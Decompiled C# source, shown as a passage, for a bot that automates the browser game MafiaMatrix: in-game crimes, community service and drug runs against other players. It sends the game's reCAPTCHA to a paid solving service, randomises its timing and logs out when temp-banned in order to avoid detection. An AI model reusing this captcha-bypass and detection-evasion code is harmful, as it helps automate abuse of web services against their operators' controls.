			this.geckoOther.NavigateFinishedNotifier.BlockUntilNavigationFinished();
			mimeInputStream.Dispose();
			GeckoElement documentElement = this.geckoOther.Document.DocumentElement;
			if (documentElement is GeckoHtmlElement)
			{
				string innerHtml = ((GeckoHtmlElement)documentElement).InnerHtml;
				if (this.getBetween(innerHtml, "<title>MafiaMatrix - ", "</title>") == "")
				{
					this.WaitNSeconds(13);
				}
			}
		}

		// Token: 0x06000025 RID: 37
		protected void NavigateWithPostDataCasino(string URLToGoTo, string POSTData)
		{
			POSTData = POSTData.Replace(' ', '+');
			MimeInputStream mimeInputStream = MimeInputStream.Create();
			mimeInputStream.AddHeader("Content-Type", "application/x-www-form-urlencoded");
			mimeInputStream.AddContentLength = true;
			mimeInputStream.SetData(POSTData);
			this.geckoCasino.Navigate(URLToGoTo, GeckoLoadFlags.BypassCache, this.geckoCasino.Url.AbsoluteUri, mimeInputStream);
			this.geckoCasino.NavigateFinishedNotifier.BlockUntilNavigationFinished();
			mimeInputStream.Dispose();
			GeckoElement documentElement = this.geckoCasino.Document.DocumentElement;
			if (documentElement is GeckoHtmlElement)
			{
				string innerHtml = ((GeckoHtmlElement)documentElement).InnerHtml;
				if (this.getBetween(innerHtml, "<title>MafiaMatrix - ", "</title>") == "")
				{
					this.WaitNSeconds(13);
				}
			}
		}

		// Token: 0x06000026 RID: 38
		protected void NavigateFinishMain(string urlToGo)
		{
			this.geckoMain.Navigate(urlToGo);
			this.geckoMain.NavigateFinishedNotifier.BlockUntilNavigationFinished();
			GeckoElement documentElement = this.geckoMain.Document.DocumentElement;
			if (documentElement is GeckoHtmlElement)
			{
				string innerHtml = ((GeckoHtmlElement)documentElement).InnerHtml;
				if (this.getBetween(innerHtml, "<title>MafiaMatrix - ", "</title>") == "")
				{
					this.WaitNSeconds(13);
				}
			}
		}

		// Token: 0x06000027 RID: 39
		protected void NavigateFinishEarn(string urlToGo)
		{
			this.geckoEarn.Navigate(urlToGo);
			this.geckoEarn.NavigateFinishedNotifier.BlockUntilNavigationFinished();
			GeckoElement documentElement = this.geckoEarn.Document.DocumentElement;
			if (documentElement is GeckoHtmlElement)
			{
				string innerHtml = ((GeckoHtmlElement)documentElement).InnerHtml;
				if (this.getBetween(innerHtml, "<title>MafiaMatrix - ", "</title>") == "")
				{
					this.WaitNSeconds(13);
				}
			}
		}

		// Token: 0x06000028 RID: 40
		protected void NavigateFinishCrime(string urlToGo)
		{
			this.geckoCrime.Navigate(urlToGo);
			this.geckoCrime.NavigateFinishedNotifier.BlockUntilNavigationFinished();
			GeckoElement documentElement = this.geckoCrime.Document.DocumentElement;
			if (documentElement is GeckoHtmlElement)
			{
				string innerHtml = ((GeckoHtmlElement)documentElement).InnerHtml;
				if (this.getBetween(innerHtml, "<title>MafiaMatrix - ", "</title>") == "")
				{
					this.WaitNSeconds(13);
				}
			}
		}

		// Token: 0x06000029 RID: 41
		protected void NavigateFinishOther(string urlToGo)
		{
			this.geckoOther.Navigate(urlToGo);
			this.geckoOther.NavigateFinishedNotifier.BlockUntilNavigationFinished();
			GeckoElement documentElement = this.geckoOther.Document.DocumentElement;
			if (documentElement is GeckoHtmlElement)
			{
				string innerHtml = ((GeckoHtmlElement)documentElement).InnerHtml;
				if (this.getBetween(innerHtml, "<title>MafiaMatrix - ", "</title>") == "")
				{
					this.WaitNSeconds(13);
				}
			}
		}

		// Token: 0x0600002A RID: 42
		protected void NavigateFinishCasino(string urlToGo)
		{
			this.geckoCasino.Navigate(urlToGo);
			this.geckoCasino.NavigateFinishedNotifier.BlockUntilNavigationFinished();
			GeckoElement documentElement = this.geckoCasino.Document.DocumentElement;
			if (documentElement is GeckoHtmlElement)
			{
				string innerHtml = ((GeckoHtmlElement)documentElement).InnerHtml;
				if (this.getBetween(innerHtml, "<title>MafiaMatrix - ", "</title>") == "")
				{
					this.WaitNSeconds(13);
				}
			}
		}

		// Token: 0x0600002B RID: 43
		private void btnEarn_Click(object sender, EventArgs e)
		{
			this.earnTimer.Stop();
			this.earnTxt.AppendText(this.doEarn());
			this.txtEarnSpan.Text = TimeSpan.FromMilliseconds((double)this.earnTimer.Interval).ToString();
		}

		// Token: 0x0600002C RID: 44
		private void earnTimer_Tick(object sender, EventArgs e)
		{
			this.earnTimer.Stop();
			this.earnTxt.AppendText(this.doEarn());
			this.earnTxt.ScrollToCaret();
			this.txtEarnSpan.Text = TimeSpan.FromMilliseconds((double)this.earnTimer.Interval).ToString();
			if (DateTime.Now > this.dtpLogOffTime.Value)
			{
				this.NavigateFinishMain("https://mafiamatrix.com/default.asp?action=logout");
				this.stopAllTimer("");
				Application.ExitThread();
				Application.Exit();
				Environment.Exit(1);
			}
			if (this.isTempBanned())
			{
				this.NavigateFinishMain("https://mafiamatrix.com/default.asp?action=logout");
				this.stopAllTimer("");
				Application.ExitThread();
				Application.Exit();
				Environment.Exit(1);
			}
		}

		// Token: 0x0600002D RID: 45
		public string playerName()
		{
			string result = string.Empty;
			GeckoElement documentElement = this.geckoMain.Document.DocumentElement;
			if (documentElement is GeckoHtmlElement)
			{
				string innerHtml = ((GeckoHtmlElement)documentElement).InnerHtml;
				result = this.getBetween(innerHtml, "var info_username='", "';");
			}
			return result;
		}

		// Token: 0x0600002E RID: 46
		public string cityName()
		{
			string result = string.Empty;
			GeckoElement documentElement = this.geckoMain.Document.DocumentElement;
			if (documentElement is GeckoHtmlElement)
			{
				string innerHtml = ((GeckoHtmlElement)documentElement).InnerHtml;
				result = this.getBetween(innerHtml, "location: \"", "\"");
			}
			return result;
		}

		// Token: 0x0600002F RID: 47
		private void solveRandom()
		{
			string clientKey = ConfigurationManager.AppSettings["AKey"].ToString();
			string arg = string.Empty;
			bool flag = false;
			NoCaptchaProxyless noCaptchaProxyless = new NoCaptchaProxyless
			{
				ClientKey = clientKey,
				WebsiteUrl = new Uri("https://www.mafiamatrix.com/random.asp"),
				WebsiteKey = "6LeLBQwTAAAAAEjOl7RVSY-x9mxPOxSOSkkR24aY"
			};
			if (!noCaptchaProxyless.CreateTask())
			{
				this.NavigateFinishMain("https://www.mafiamatrix.com/main.asp");
			}
			else if (!noCaptchaProxyless.WaitForResult(120, 0))
			{
				this.NavigateFinishMain("https://www.mafiamatrix.com/main.asp");
			}
			else
			{
				flag = true;
				arg = noCaptchaProxyless.GetTaskSolution().GRecaptchaResponse;
			}
			if (flag)
			{
				string postdata = string.Format("g-recaptcha-response={0}&action={1}", arg, "confirm");
				this.NavigateWithPostDataMain("https://mafiamatrix.com/random.asp", postdata);
			}
		}

		// Token: 0x06000030 RID: 48
		private void paybackTimer_Tick(object sender, EventArgs e)
		{
			this.paybackTimer.Stop();
			if (this.payback1 != "")
			{
				this.transfer(this.payback1, this.payback2, this.paybackMessage);
			}
		}

		// Token: 0x06000031 RID: 49
		private string doAgg(bool payback)
		{
			this.txtLastAction.Text = "Doing Agg";
			DateTime now = DateTime.Now;
			this.renewList();
			this.stopAllTimer("agg");
			this.aggCount++;
			this.crimeType = this.txtCrime.Text;
			string result;
			try
			{
				Random random = new Random();
				int num = Convert.ToInt32(this.aggTxtWaitTime.Text) * 60000;
				if (this.txtCrime.Text == "torchb")
				{
					this.aggUrl = "https://mafiamatrix.com/income/torchbusiness.asp";
				}
				else
				{
					this.aggUrl = "https://mafiamatrix.com/income/" + this.txtCrime.Text + ".asp";
				}
				bool businessType = false;
				if (this.crimeType == "armed" || this.crimeType == "torchb")
				{
					businessType = true;
				}
				string location = this.cityName();
				string text = this.crime(this.crimeType, this.aggUrl, businessType, location);
				if (text.Contains("Captcha") || text.Contains("Cloudfare"))
				{
					this.NavigateFinishCrime("https://mafiamatrix.com/main.asp");
					string a = string.Empty;
					GeckoElement documentElement = this.geckoCrime.Document.DocumentElement;
					if (documentElement is GeckoHtmlElement)
					{
						string innerHtml = ((GeckoHtmlElement)documentElement).InnerHtml;
						a = this.getBetween(innerHtml, "<title>MafiaMatrix - ", "</title>");
					}
					while (a == "Random")
					{
						this.solveRandom();
						this.NavigateFinishCrime("https://mafiamatrix.com/main.asp");
						GeckoElement documentElement2 = this.geckoCrime.Document.DocumentElement;
						if (documentElement2 is GeckoHtmlElement)
						{
							string innerHtml2 = ((GeckoHtmlElement)documentElement2).InnerHtml;
							a = this.getBetween(innerHtml2, "<title>MafiaMatrix - ", "</title>");
							if (a != "Random")
							{
								this.aggTxt.AppendText("Captcha bypassed! \n");
							}
						}
					}
					this.aggCount--;
					this.aggTimer.Interval = random.Next(60000, 66000);
					this.aggTimer.Start();
					this.aggStartTime = DateTime.Now;
					this.startAllTimer("agg");
					result = string.Concat(new string[]
					{
						"[",
						DateTime.Now.ToLongTimeString(),
						"] ",
						text,
						"\n"
					});
				}
				else if (text == "All targets currently under agg protection")
				{
					this.aggCount--;
					int interval = random.Next(200000, 240000);
					this.aggTimer.Interval = interval;
					this.aggTimer.Start();
					this.aggStartTime = DateTime.Now;
					this.startAllTimer("agg");
					if (this.txtCrime.Text != this.txtCrime2.Text)
					{
						this.doAgg2(payback, true);
					}
					result = string.Concat(new string[]
					{
						"[",
						DateTime.Now.ToLongTimeString(),
						"] ",
						text,
						"\n"
					});
				}
				else
				{
					if (payback && this.crimeType == "pickpocket")
					{
						string between = this.getBetween(text, "You pickpocketed ", " for ");
						string cash = this.getBetween(text, "$", "!").Replace(",", "");
						if (between != "")
						{
							this.paybackPP(between, cash);
							int interval2 = new Random().Next(5000, 35000);
							this.paybackTimer.Interval = interval2;
							this.paybackTimer.Start();
							this.paybackStartTime = DateTime.Now;
						}
					}
					int num2 = new Random().Next(0, 3);
					this.aggTimer.Interval = random.Next(num, num + num2);
					this.aggTimer.Start();
					this.aggStartTime = DateTime.Now;
					this.startAllTimer("agg");
					if (this.secondCrime)
					{
						this.doAgg2(payback, false);
					}
					result = string.Concat(new object[]
					{
						"[",
						this.aggCount,
						" - ",
						DateTime.Now.ToLongTimeString(),
						"] ",
						text,
						"\n"
					});
				}
			}
			catch (Exception)
			{
				this.aggCount--;
				int interval3 = new Random().Next(200000, 240000);
				this.aggTimer.Interval = interval3;
				this.aggTimer.Start();
				this.aggStartTime = DateTime.Now;
				this.startAllTimer("agg");
				result = "[" + DateTime.Now.ToLongTimeString() + "] Something wrong, trying in a few minutes \n";
			}
			return result;
		}

		// Token: 0x06000032 RID: 50
		private void doAgg2(bool payback, bool noTarget)
		{
			this.txtLastAction.Text = "Doing 2nd Agg";
			DateTime now = DateTime.Now;
			if (noTarget)
			{
				this.renewList();
				this.stopAllTimer("agg");
			}
			this.aggCount++;
			this.crimeType = this.txtCrime2.Text;
			try
			{
				Random random = new Random();
				int num = Convert.ToInt32(this.aggTxtWaitTime.Text) * 60000;
				if (this.txtCrime2.Text == "torchb")
				{
					this.aggUrl = "https://mafiamatrix.com/income/torchbusiness.asp";
				}
				else
				{
					this.aggUrl = "https://mafiamatrix.com/income/" + this.txtCrime2.Text + ".asp";
				}
				bool businessType = false;
				if (this.crimeType == "armed" || this.crimeType == "torchb")
				{
					businessType = true;
				}
				string location = this.cityName();
				string text = this.crime(this.crimeType, this.aggUrl, businessType, location);
				if (text.Contains("Captcha") || text.Contains("Cloudfare"))
				{
					this.NavigateFinishCrime("https://mafiamatrix.com/main.asp");
					string a = string.Empty;
					GeckoElement documentElement = this.geckoCrime.Document.DocumentElement;
					if (documentElement is GeckoHtmlElement)
					{
						string innerHtml = ((GeckoHtmlElement)documentElement).InnerHtml;
						a = this.getBetween(innerHtml, "<title>MafiaMatrix - ", "</title>");
					}
					while (a == "Random")
					{
						this.solveRandom();
						this.NavigateFinishCrime("https://mafiamatrix.com/main.asp");
						GeckoElement documentElement2 = this.geckoCrime.Document.DocumentElement;
						if (documentElement2 is GeckoHtmlElement)
						{
							string innerHtml2 = ((GeckoHtmlElement)documentElement2).InnerHtml;
							a = this.getBetween(innerHtml2, "<title>MafiaMatrix - ", "</title>");
							if (a != "Random")
							{
								this.aggTxt.AppendText("Captcha bypassed! \n");
							}
						}
					}
					this.aggCount--;
					if (noTarget)
					{
						this.aggTimer.Interval = random.Next(200000, 240000);
						this.aggTimer.Start();
						this.aggStartTime = DateTime.Now;
						this.startAllTimer("agg");
					}
					this.aggTxt.AppendText(string.Concat(new string[]
					{
						"[",
						DateTime.Now.ToLongTimeString(),
						"] ",
						text,
						"\n"
					}));
				}
				if (text == "All targets currently under agg protection")
				{
					this.aggCount--;
					if (noTarget)
					{
						int interval = random.Next(200000, 240000);
						this.aggTimer.Interval = interval;
						this.aggTimer.Start();
						this.aggStartTime = DateTime.Now;
						this.startAllTimer("agg");
					}
					this.aggTxt.AppendText(string.Concat(new string[]
					{
						"[",
						DateTime.Now.ToLongTimeString(),
						"] ",
						text,
						"\n"
					}));
				}
				else
				{
					if (payback && this.crimeType == "pickpocket")
					{
						string between = this.getBetween(text, "You pickpocketed ", " for ");
						string cash = this.getBetween(text, "$", "!").Replace(",", "");
						if (between != "")
						{
							this.paybackPP(between, cash);
							int interval2 = new Random().Next(5000, 35000);
							this.paybackTimer.Interval = interval2;
							this.paybackTimer.Start();
							this.paybackStartTime = DateTime.Now;
						}
					}
					if (noTarget)
					{
						int num2 = new Random().Next(0, 3);
						this.aggTimer.Interval = random.Next(num, num + num2);
						this.aggTimer.Start();
						this.aggStartTime = DateTime.Now;
						this.startAllTimer("agg");
					}
					this.aggTxt.AppendText(string.Concat(new object[]
					{
						"[",
						this.aggCount,
						" - ",
						DateTime.Now.ToLongTimeString(),
						"] ",
						text,
						"\n"
					}));
				}
			}
			catch (Exception)
			{
				this.aggCount--;
				if (noTarget)
				{
					int interval3 = new Random().Next(200000, 240000);
					this.aggTimer.Interval = interval3;
					this.aggTimer.Start();
					this.aggStartTime = DateTime.Now;
					this.startAllTimer("agg");
				}
				this.aggTxt.AppendText("[" + DateTime.Now.ToLongTimeString() + "] Something wrong, trying in a few minutes \n");
			}
		}

		// Token: 0x06000033 RID: 51
		public string[] onlineList()
		{
			this.txtLastAction.Text = "Getting Online List";
			string html = string.Empty;
			GeckoElement documentElement = this.geckoMain.Document.DocumentElement;
			if (documentElement is GeckoHtmlElement)
			{
				html = ((GeckoHtmlElement)documentElement).InnerHtml;
			}
			HtmlAgilityPack.HtmlDocument htmlDocument = new HtmlAgilityPack.HtmlDocument();
			htmlDocument.LoadHtml(html);
			List<string> list = new List<string>();
			foreach (HtmlNode htmlNode in ((IEnumerable<HtmlNode>)htmlDocument.DocumentNode.SelectNodes("//div[@class='whosonlinecell']")))
			{
				list.Add(htmlNode.InnerText);
			}
			using (List<string>.Enumerator enumerator2 = list.GetEnumerator())
			{
				if (enumerator2.MoveNext())
				{
					string text3 = enumerator2.Current.Substring(14).Replace("|", "");
					char[] separator = new char[]
					{
						' '
					};
					return text3.Split(separator);
				}
			}
			return null;
		}

		// Token: 0x06000034 RID: 52
		private void paybackPP(string charName, string cash)
		{
			this.txtLastAction.Text = "Paying Back PP";
			if (this.payback)
			{
				this.payback1 = charName;
				this.payback2 = cash;
				this.paybackMessage = this.txtPBMessage.Text;
				return;
			}
			if (!(charName == "Bar"))
			{
				if (!(charName == "Clothing Shop"))
				{
					if (!(charName == "Fire Station"))
					{
						if (!(charName == "Construction Company"))
						{
							this.payback1 = "";
						}
						else
						{
							this.payback1 = "Vivitar";
						}
					}
					else
					{
						this.payback1 = "Panther";
					}
				}
				else
				{
					this.payback1 = "Ozai";
				}
			}
			else
			{
				this.payback1 = "Malice";
			}
			this.payback2 = cash;
			Random random = new Random();
			object obj = (new string[]
			{
				"del thx",
				"pls del",
				"del pls",
				"dont report",
				"del plsss"
			})[random.Next(6)];
			this.paybackMessage = this.txtPBMessage.Text;
		}

		// Token: 0x06000035 RID: 53
		public void transfer(string name, string amount, string message)
		{
			string urltoGoTo = "https://mafiamatrix.com/income/transfer.asp";
			string postdata = string.Format("transferamount={0}&transfername={1}&transferreason={2}", amount, name, message);
			this.NavigateWithPostDataCrime(urltoGoTo, postdata);
		}

		// Token: 0x06000036 RID: 54
		public string crime(string type, string aggUrl, bool businessType, string location)
		{
			string result;
			try
			{
				this.NavigateFinishCrime("https://mafiamatrix.com/localcity/local.asp");
				string htmlCode = string.Empty;
				GeckoElement documentElement = this.geckoCrime.Document.DocumentElement;
				if (documentElement is GeckoHtmlElement)
				{
					htmlCode = ((GeckoHtmlElement)documentElement).InnerHtml;
				}
				List<string> list = this.excludeBurningBusiness(htmlCode);
				string urltoGoTo = "https://mafiamatrix.com/income/agcrime.asp";
				string arg = string.Empty;
				if (type == "torchb")
				{
					arg = "torchbusiness";
				}
				else
				{
					arg = type;
				}
				string postdata = string.Format("agcrime={0}", arg);
				this.NavigateWithPostDataCrime(urltoGoTo, postdata);
				string strSource = string.Empty;
				GeckoElement documentElement2 = this.geckoCrime.Document.DocumentElement;
				if (documentElement2 is GeckoHtmlElement)
				{
					strSource = ((GeckoHtmlElement)documentElement2).InnerHtml;
				}
				string between = this.getBetween(strSource, "<select name=\"" + type + "\" class=\"dropdown\">", "</select>");
				IEnumerable<string> target = this.getTarget(between, "<option value=\"", "\">");
				if (businessType)
				{
					IEnumerable<string> enumerable;
					if (type == "armed")
					{
						IEnumerable<string> second = this.getExcludeBusinessAR();
						enumerable = target.Except(second);
						if (list.Count > 0)
						{
							second = list;
							enumerable = enumerable.Except(second);
						}
					}
					else
					{
						IEnumerable<string> excludeBusinessTorch = this.getExcludeBusinessTorch(location);
						enumerable = target.Except(excludeBusinessTorch);
					}
					using (IEnumerator<string> enumerator = enumerable.GetEnumerator())
					{
						while (enumerator.MoveNext())
						{
							string text = enumerator.Current;
							if (this.stopCrime)
							{
								this.stopCrime = false;
								break;
							}
							string postdata2 = string.Format(type + "={0}", text);
							this.NavigateWithPostDataCrime(aggUrl, postdata2);
							string strSource2 = string.Empty;
							GeckoElement documentElement3 = this.geckoCrime.Document.DocumentElement;
							if (documentElement3 is GeckoHtmlElement)
							{
								strSource2 = ((GeckoHtmlElement)documentElement3).InnerHtml;
							}
							string between2 = this.getBetween(strSource2, "<div id=\"success\">", "</div>");
							string between3 = this.getBetween(strSource2, "<div id=\"fail\">", "</div>");
							string between4 = this.getBetween(strSource2, "<title>MafiaMatrix - ", "</title>");
							if (between4 == "Random")
							{
								return between2 + "Please Fill In Captcha";
							}
							if (between4 == "")
							{
								return between2 + " Cloudfare";
							}
							if (between2 != "")
							{
								return between2 + "\t-" + text;
							}
							if (between3.Contains("failed"))
							{
								return between3 + "\t-" + text;
							}
							bool flag = between3 != null;
						}
						goto IL_6ED;
					}
				}
				IEnumerable<string> excludePlayer = this.getExcludePlayer();
				target.Except(excludePlayer);
				if (type.Equals("breaking") || type.Equals("hack"))
				{
					this.NavigateFinishCrime("https://mafiamatrix.com/skin/updateusers.php?q=1");
					string value = string.Empty;
					GeckoElement documentElement4 = this.geckoCrime.Document.DocumentElement;
					if (documentElement4 is GeckoHtmlElement)
					{
						value = ((GeckoHtmlElement)documentElement4).TextContent;
					}
					using (List<PlayerList>.Enumerator enumerator2 = (from o in JsonConvert.DeserializeObject<List<PlayerList>>(value)
					orderby int.Parse(o.id_str) descending
					select o).ToList<PlayerList>().GetEnumerator())
					{
						while (enumerator2.MoveNext())
						{
							PlayerList playerList = enumerator2.Current;
							if (this.stopCrime)
							{
								this.stopCrime = false;
								break;
							}
							string text2 = string.Empty;
							if (!playerList.userRank.Equals("Godfather") && !playerList.userRank.Equals("Capo di tutti capi") && !playerList.userRank.Equals("Don") && !playerList.userRank.Equals("Boss") && !(playerList.userName == this.txtCharName.Text))
							{
								if (playerList.userHomeCity.Equals(location, StringComparison.InvariantCultureIgnoreCase) && playerList.userStatus.Equals("Alive"))
								{
									text2 = playerList.userName;
								}
								if (!string.IsNullOrEmpty(text2) && !string.IsNullOrWhiteSpace(text2))
								{
									string postdata3 = string.Format(type + "={0}", text2);
									this.NavigateWithPostDataCrime(aggUrl, postdata3);
									string strSource3 = string.Empty;
									GeckoElement documentElement5 = this.geckoCrime.Document.DocumentElement;
									if (documentElement5 is GeckoHtmlElement)
									{
										strSource3 = ((GeckoHtmlElement)documentElement5).InnerHtml;
									}
									string between5 = this.getBetween(strSource3, "<div id=\"success\">", "</div>");
									string between6 = this.getBetween(strSource3, "<div id=\"fail\">", "</div>");
									string between7 = this.getBetween(strSource3, "<title>MafiaMatrix - ", "</title>");
									if (between7 == "Random")
									{
										return between5 + "Please Fill In Captcha";
									}
									if (between7 == "")
									{
										return between5 + " Cloudfare";
									}
									if (between5 != "")
									{
										return between5 + "\t-" + text2;
									}
									if (between6.Contains("failed"))
									{
										return between6 + "\t-" + text2;
									}
									bool flag2 = between6 != null;
								}
							}
						}
						goto IL_6ED;
					}
				}
				foreach (string text3 in this.onlineList().Except(excludePlayer))
				{
					if (this.stopCrime)
					{
						this.stopCrime = false;
						break;
					}
					if (!string.IsNullOrEmpty(text3) && !string.IsNullOrWhiteSpace(text3) && !text3.Equals(this.txtCharName.Text))
					{
						string postdata4 = string.Format(type + "={0}", text3);
						this.NavigateWithPostDataCrime(aggUrl, postdata4);
						string strSource4 = string.Empty;
						GeckoElement documentElement6 = this.geckoCrime.Document.DocumentElement;
						if (documentElement6 is GeckoHtmlElement)
						{
							strSource4 = ((GeckoHtmlElement)documentElement6).InnerHtml;
						}
						string between8 = this.getBetween(strSource4, "<div id=\"success\">", "</div>");
						string between9 = this.getBetween(strSource4, "<div id=\"fail\">", "</div>");
						string between10 = this.getBetween(strSource4, "<title>MafiaMatrix - ", "</title>");
						if (between10 == "Random")
						{
							return between8 + "Please Fill In Captcha";
						}
						if (between10 == "")
						{
							return between8 + " Cloudfare";
						}
						if (between8 != "")
						{
							return between8 + "\t-" + text3;
						}
						if (between9.Contains("failed"))
						{
							return between9 + "\t-" + text3;
						}
						bool flag3 = between9 != null;
					}
				}
				IL_6ED:
				result = "All targets currently under agg protection";
			}
			catch (Exception)
			{
				throw;
			}
			return result;
		}

		// Token: 0x06000037 RID: 55
		public IEnumerable<string> getTarget(string input, string start, string end)
		{
			MatchCollection matches = new Regex(Regex.Escape(start) + "(.*?)" + Regex.Escape(end)).Matches(input);
			foreach (object obj in matches)
			{
				Match match = (Match)obj;
				yield return match.Groups[1].Value;
			}
			IEnumerator enumerator = null;
			yield break;
			yield break;
		}

		// Token: 0x06000038 RID: 56
		public IEnumerable<string> getExcludeBusinessAR()
		{
			return File.ReadAllLines("business.txt").ToList<string>();
		}

		// Token: 0x06000039 RID: 57
		public IEnumerable<string> getExcludeBusinessTorch(string location)
		{
			return File.ReadAllLines(location + ".txt").ToList<string>();
		}

		// Token: 0x0600003A RID: 58
		public IEnumerable<string> getExcludePlayer()
		{
			return File.ReadAllLines("player.txt").ToList<string>();
		}

		// Token: 0x0600003B RID: 59
		private string doCS()
		{
			this.txtLastAction.Text = "Doing CS";
			Random random = new Random();
			this.csCount++;
			string text = this.communityService(this.txtCS.Text);
			string result;
			try
			{
				if (text.Contains("Captcha"))
				{
					this.NavigateFinishOther("https://mafiamatrix.com/main.asp");
					string a = string.Empty;
					GeckoElement documentElement = this.geckoOther.Document.DocumentElement;
					if (documentElement is GeckoHtmlElement)
					{
						string innerHtml = ((GeckoHtmlElement)documentElement).InnerHtml;
						a = this.getBetween(innerHtml, "<title>MafiaMatrix - ", "</title>");
					}
					while (a == "Random")
					{
						this.solveRandom();
						this.NavigateFinishOther("https://mafiamatrix.com/main.asp");
						GeckoElement documentElement2 = this.geckoOther.Document.DocumentElement;
						if (documentElement2 is GeckoHtmlElement)
						{
							string innerHtml2 = ((GeckoHtmlElement)documentElement2).InnerHtml;
							a = this.getBetween(innerHtml2, "<title>MafiaMatrix - ", "</title>");
							if (a != "Random")
							{
								this.csText.AppendText("Captcha Done!");
							}
						}
					}
					this.csCount--;
					this.csTimer.Interval = random.Next(60000, 66000);
					this.csTimer.Start();
					this.csStartTime = DateTime.Now;
					this.startAllTimer("cs");
					result = "Captcha Bypass \n";
				}
				else if (text == "")
				{
					this.csCount--;
					this.csTimer.Interval = random.Next(60000, 66000);
					this.csTimer.Start();
					this.csStartTime = DateTime.Now;
					this.startAllTimer("cs");
					result = "Cloudfare Bypass \n";
				}
				else if (this.txtCS.Text == "law_oot")
				{
					this.csTimer.Interval = random.Next(600500, 601000);
					this.csTimer.Start();
					this.csStartTime = DateTime.Now;
					this.startAllTimer("cs");
					result = string.Concat(new object[]
					{
						"[",
						this.csCount,
						"] ",
						text,
						"\n"
					});
				}
				else
				{
					this.csTimer.Interval = random.Next(1200500, 1201000);
					this.csTimer.Start();
					this.csStartTime = DateTime.Now;
					this.startAllTimer("cs");
					result = string.Concat(new object[]
					{
						"[",
						this.csCount,
						"] ",
						text,
						"\n"
					});
				}
			}
			catch (Exception)
			{
				this.csCount--;
				this.csTimer.Interval = random.Next(60000, 66000);
				this.csTimer.Start();
				this.csStartTime = DateTime.Now;
				this.startAllTimer("cs");
				result = "Something is wrong, trying in a few minutes \n";
			}
			return result;
		}

		// Token: 0x0600003C RID: 60
		private void btnStartDrug_Click(object sender, EventArgs e)
		{
			this.drugTxt.AppendText(this.doDrug());
		}

		// Token: 0x0600003D RID: 61
		private void btnStopDrug_Click(object sender, EventArgs e)
		{
			this.drugTimer.Stop();
			this.drugTimer.Enabled = false;
		}

		// Token: 0x0600003E RID: 62
		private void btnStartCS_Click(object sender, EventArgs e)
		{
			this.csTimer.Stop();
			this.renewList();
			this.stopAllTimer("cs");
			this.csText.AppendText(this.doCS());
		}

		// Token: 0x0600003F RID: 63
		private void btnStartCrime_Click(object sender, EventArgs e)
		{
			this.aggTxt.AppendText(this.doAgg(this.payback));
		}

		// Token: 0x06000040 RID: 64
		private void chkBoxPB_CheckedChanged(object sender, EventArgs e)
		{
			if (!this.payback)
			{
				this.payback = true;
				return;
			}
			this.payback = false;
		}

		// Token: 0x06000041 RID: 65
		private void btnStopCrime_Click(object sender, EventArgs e)
		{
			this.aggTimer.Stop();
			this.aggTimer.Enabled = false;
			this.stopCrime = true;
		}

		// Token: 0x06000042 RID: 66
		private void btnStopCS_Click(object sender, EventArgs e)
		{
			this.csTimer.Stop();
			this.csTimer.Enabled = false;
		}

		// Token: 0x06000043 RID: 67
		private void drugTimer_Tick(object sender, EventArgs e)
		{
			this.drugTimer.Stop();
			Random random = new Random();
			this.drugTimer.Interval = random.Next(1200000, 1210000);
			this.drugTxt.AppendText(this.doDrug());
			this.drugTxt.ScrollToCaret();
		}

		// Token: 0x06000044 RID: 68
		private void aggTimer_Tick(object sender, EventArgs e)
		{
			this.aggTimer.Stop();
			this.aggTxt.AppendText(this.doAgg(this.payback));
			this.aggTxt.ScrollToCaret();
		}

		// Token: 0x06000045 RID: 69
		private void relogTimer_Tick(object sender, EventArgs e)
		{
			this.relogin();
		}

		// Token: 0x06000046 RID: 70
		private void csTimer_Tick(object sender, EventArgs e)
		{
			this.csTimer.Stop();
			this.renewList();
			this.stopAllTimer("cs");
			new Random().Next(1200000, 1230000);
			this.csText.AppendText(this.doCS());
			this.csText.ScrollToCaret();
		}

		// Token: 0x06000047 RID: 71
		private void btnStartJailEarn_Click(object sender, EventArgs e)
		{
			DateTime now = DateTime.Now;
			string text = this.txtJailEarn.Text;
			this.jailEarnTxt.AppendText(string.Concat(new string[]
			{
				"[",
				DateTime.Now.ToLongTimeString(),
				"] ",
				this.jailEarn(text),
				"\n"
			}));
		}

		// Token: 0x06000048 RID: 72
		private string doDrug()
		{
			Random random = new Random();
			this.renewList();
			this.stopAllTimer("drug");
			this.drugCount++;
			string text = this.drugUnit();
			string result;
			try
			{
				if (text.Contains("Captcha"))
				{
					this.NavigateFinishOther("https://mafiamatrix.com/main.asp");
					string a = string.Empty;
					GeckoElement documentElement = this.geckoOther.Document.DocumentElement;
					if (documentElement is GeckoHtmlElement)
					{
						string innerHtml = ((GeckoHtmlElement)documentElement).InnerHtml;
						a = this.getBetween(innerHtml, "<title>MafiaMatrix - ", "</title>");
					}
					while (a == "Random")
					{
						this.solveRandom();
						this.NavigateFinishOther("https://mafiamatrix.com/main.asp");
						GeckoElement documentElement2 = this.geckoOther.Document.DocumentElement;
						if (documentElement2 is GeckoHtmlElement)
						{
							string innerHtml2 = ((GeckoHtmlElement)documentElement2).InnerHtml;
							a = this.getBetween(innerHtml2, "<title>MafiaMatrix - ", "</title>");
							if (a != "Random")
							{
								this.drugTxt.AppendText("Captcha Done!");
							}
						}
					}
					this.drugCount--;
					this.drugTimer.Interval = random.Next(60000, 66000);
					this.drugTimer.Start();
					this.drugStartTime = DateTime.Now;
					this.startAllTimer("drug");
					result = "Captcha Bypass \n";
				}
				else if (text.Contains("Cloudfare"))
				{
					this.drugCount--;
					this.drugTimer.Interval = random.Next(60000, 66000);
					this.drugTimer.Start();
					this.drugStartTime = DateTime.Now;
					this.startAllTimer("drug");
					result = "Cloudfare Bypass \n";
				}
				else
				{
					this.drugTimer.Interval = random.Next(1204000, 1214000);
					this.drugTimer.Start();
					this.drugStartTime = DateTime.Now;
					this.startAllTimer("drug");
					result = string.Concat(new object[]
					{
						"[",
						this.drugCount,
						"] ",
						text,
						"\n"
					});
				}
			}
			catch (Exception)
			{
				this.drugCount--;
				this.drugTimer.Interval = random.Next(60000, 66000);
				this.drugTimer.Start();
				this.drugStartTime = DateTime.Now;
				this.startAllTimer("drug");
				result = "Something is wrong, trying in a few min \n";
			}
			return result;
		}

		// Token: 0x06000049 RID: 73
		public string communityService(string cs)
		{
			string result;
			try
			{
				string urltoGoTo = "https://mafiamatrix.com/income/communityservice.asp";
				string postdata = string.Empty;
				if (cs == "law_oot")
				{
					postdata = string.Format("comservice={0}&csinothercities={1}", cs, "law");
				}
				else
				{
					postdata = string.Format("comservice={0}", cs);
				}
				this.NavigateWithPostDataOther(urltoGoTo, postdata);
				string strSource = string.Empty;
